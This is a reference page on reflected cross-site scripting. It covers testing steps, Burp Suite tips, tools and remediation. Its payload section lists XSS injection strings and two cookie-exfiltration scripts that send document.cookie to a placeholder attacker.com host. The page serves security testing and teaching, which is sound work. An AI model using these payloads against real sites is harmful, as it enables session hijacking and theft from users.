# Reflected XSS

## Overview
Reflected Cross-Site Scripting (XSS) occurs when user-supplied input is immediately returned by a web server in an HTTP response without being properly sanitized or encoded. The malicious script is "reflected" off the server and executed in the victim's browser within the context of the trusted site. Unlike stored XSS, the payload is not persisted on the server — it must be delivered to the victim through a crafted URL or form submission, typically via phishing.

## How It Works
An attacker identifies an input parameter (query string, form field, HTTP header) that is echoed back in the server's HTML response without encoding. The attacker crafts a URL containing a JavaScript payload in that parameter and tricks a victim into clicking it. When the victim's browser renders the response, it interprets the injected script as legitimate page code and executes it in the origin of the vulnerable site. Because the script runs in the victim's browser under the target domain, it has full access to cookies, session tokens, DOM content, and can make authenticated requests on behalf of the user.

## Impact
- Session hijacking by stealing authentication cookies (`document.cookie`)
- Credential harvesting via injected fake login forms
- Keylogging and capturing user input on the page
- Redirecting the victim to attacker-controlled phishing pages
- Performing actions on behalf of the victim (CSRF-equivalent)
- Defacement of the page as seen by the victim
- Port scanning internal network through the victim's browser
- Bypassing CSRF protections by reading anti-CSRF tokens from the DOM

## Where to Look
- URL query parameters echoed in page content (e.g., `?search=`, `?q=`, `?error=`, `?msg=`)
- Error messages that reflect user input (e.g., "No results for: <input>")
- 404 / redirect pages that include the requested path
- HTTP headers reflected in responses: `Referer`, `User-Agent`, `X-Forwarded-For`
- Form fields that redisplay submitted values on error (e.g., login failure showing the username)
- Back-link parameters: `?redirect=`, `?return=`, `?next=`, `?url=`
- Search functionality, feedback forms, contact forms

## Testing Steps
1. Map all input parameters in the application (manual browsing + spider/crawl with Burp).
2. For each parameter, submit a benign unique string (e.g., `xsstest1234`) and search the response for where it appears.
3. Identify the HTML context: between tags, inside an attribute value, inside a `<script>` block, inside a CSS value, inside an HTML comment.
4. Craft a payload appropriate for that context (see Payloads section).
5. Submit the payload and inspect the response in the browser developer tools — check if the script tag or event handler appears unencoded.
6. Verify execution by observing a browser alert or an out-of-band callback.
7. Test all HTTP methods (GET, POST) and test headers (User-Agent, Referer) for reflection.
8. If a WAF blocks the payload, try bypass techniques (encoding, case variation, alternative tags).
9. Confirm the finding is exploitable by crafting a complete PoC URL and testing it in an isolated browser session.

## Payloads / Techniques

**Basic alert (HTML body context):**
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
```

**Attribute context (breaking out of attribute value):**
```html
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
'><script>alert(1)</script>
" ><img src=x onerror=alert(1)>
```

**Href/src attribute (JavaScript URI):**
```html
javascript:alert(1)
```

**Inside a script block (breaking out of string):**
```javascript
'-alert(1)-'
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

**Tag variations (when `<script>` is blocked):**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

**Cookie exfiltration payload:**
```javascript
<script>new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>
```

**Fetch-based exfiltration:**
```javascript
<script>fetch('https://attacker.com/?c='+btoa(document.cookie))</script>
```

**URL to deliver reflected XSS:**
```
https://victim.com/search?q=<script>alert(1)</script>
https://victim.com/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

## Burp Suite Tips
- Use **Burp Proxy** to intercept requests and manually insert payloads in each parameter.
- Use **Burp Scanner** (Pro) to automatically detect reflected XSS; review findings for false positives.
- Use the **Intruder** module with a XSS wordlist (e.g., from SecLists `Fuzzing/XSS/XSS-Jhaddix.txt`) to fuzz multiple parameters efficiently.
- In **Repeater**, insert the probe string `xsstest1234` first to find reflection points, then craft a targeted payload.
- Enable **Burp's DOM Invader** (browser extension) to detect reflection points including DOM sinks automatically.
- Use the **"Render"** tab in Repeater to visually confirm if a payload executes in Burp's embedded browser.
- Check the **HTTP history** filter for responses containing your probe string to identify unexpected reflection points.
- Set a **match-and-replace rule** in Proxy to automatically inject a probe into all requests.

## Tools
- Burp Suite Pro (Scanner + DOM Invader)
- OWASP ZAP (Active Scanner)
- XSStrike — https://github.com/s0md3v/XSStrike
- Dalfox — https://github.com/hahwul/dalfox
- kxss — https://github.com/tomnomnom/kxss (pipeline-friendly reflection finder)
- ffuf / wfuzz (parameter fuzzing)
- SecLists XSS payloads — https://github.com/danielmiessler/SecLists

## Remediation
- **Output encoding**: HTML-encode all user-supplied data before inserting it into HTML context. Use context-appropriate encoding (HTML entity encoding for body/attributes, JavaScript encoding for script contexts, URL encoding for URLs).
- Use a templating engine that auto-escapes output by default (e.g., Jinja2, Thymeleaf, React JSX).
- **Content Security Policy (CSP)**: Implement a strict CSP header to prevent inline script execution and restrict script sources: `Content-Security-Policy: default-src 'self'; script-src 'self'`.
- Set the `HttpOnly` flag on session cookies to prevent JavaScript access: `Set-Cookie: session=...; HttpOnly; Secure`.
- Validate and whitelist input on the server side — reject or strip HTML/JavaScript characters where rich text is not expected.
- Use a modern security-focused framework that handles encoding automatically (e.g., React, Angular with DomSanitizer).
- Never insert untrusted data directly into a `<script>` block, HTML event attribute, CSS property, or URL without thorough sanitization.

## References
https://owasp.org/www-community/attacks/xss/
https://portswigger.net/web-security/cross-site-scripting/reflected
https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)
https://portswigger.net/research/xss-cheat-sheet
